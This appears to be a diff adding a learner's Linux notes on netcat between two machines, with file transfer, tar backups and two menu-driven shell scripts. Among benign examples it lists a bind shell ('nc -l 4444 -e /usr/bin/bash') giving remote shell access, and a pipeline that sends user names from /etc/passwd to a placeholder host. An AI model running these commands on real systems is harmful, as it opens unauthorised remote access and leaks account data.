@@ -1,0 +1,125 @@
+
+
+      OS1 ( Linux )                                                                             OS2 ( Linux )
+
+check ping <ip of os2 >                                                           check ping < ip of OS1 >
+  
+  yum install nc -y                                                             yum install nc -y 
+  
+  nc --->  netcat
+  
+  nc -l  2222                                                                   nc < ip of OS1 >  2222
+  
+  then when any data is inputed in OS2  it will updated in the OS1 console 
+  
+  
+  nc -l 1234  -e  date                                                          nc < ip of OS1 >  1234  (  then the output of date dispaly here )
+  
+  nc -l 3212  > kanna.txt                                                       date  |  nc < ip  of   OS1 >  3212    
+        
+          the output of date will  store in kanna.txt
+  
+  cat  /etc/passwd   |  grep bash  | cut -f1 -d:  | nc  <ip>   <port>
+  
+ | ----Extract-----  | |  -------- Transform -----| | ----- Load ---- |
+  
+  
+  
+  nc -l   4444   -e  /usr/bin/bash                                                nc < ip of OS1  >  4444
+  
+          by the above way the complete computer access of OS1 will be given to OS2   (  a kind of hacker thing )
+  
+    tar  -c -z  -f  backup.tar.gz     < folder  >      ---  to   Archieve  the folder 
+  
+  by the above info  create  a backup file in  one  OS  and transfer  to other  OS  
+  
+  
+          hostname  -i   (  to get IP  address )  
+  
+  
+  vim  c.sh 
+  
+                  #!/bin/bash
+
+
+                  echo " select the option to perform operation "
+                  echo " press 1 : to start chat "
+                  echo " press 2 : to view date "
+                  echo " press 3 : to view calender "
+                  echo " press 4 : to transfer  chat remotely "
+
+
+                  read -p "enter your choice "  option
+
+                  echo $option
+                  if [ $option -eq 1 ]
+                  then
+                          read -p "enter port " port
+                          nc -l $port
+
+                  elif  [ $option -eq 2 ]
+                  then
+                          date
+
+                  elif  [ $option -eq 3 ]
+                  then
+                          cal
+
+                  elif [ $option -eq 4 ]
+                  then
+                          read -p " enter ur port " port
+                          nc -l  $port  > chat.txt
+                  else
+                          echo " choose the appropriate option "
+                  fi
+  
+  
+  
+  we can convert the above code from ( if elif else  fi )  to ( case   esac )  
+  
+  
+  vim  c2.sh
+  
+
+                #!/bin/bash
+
+
+                echo " select the option to perform operation "
+                echo " press 1 : to start chat "
+                echo " press 2 : to view date "
+                echo " press 3 : to view calender "
+                echo " press 4 : to transfer  chat remotely "
+
+
+                read -p "enter your choice "  option
+
+                echo $option
+
+                case $option  in
+
+                        "1")
+                                read -p "enter port " port
+                                nc -l $port  &
+                                ;;
+
+                        "2")
+                                date
+                                ;;
+
+                        "3")
+                                cal
+                                ;;
+
+                        "4")
+                                read -p " enter ur port " port
+                                nc -l  $port  > chat2.txt
+                                ;;
+                        *)
+                                echo " choose the appropriate option "
+                esac
+
+  
+  
+  
+  
+  
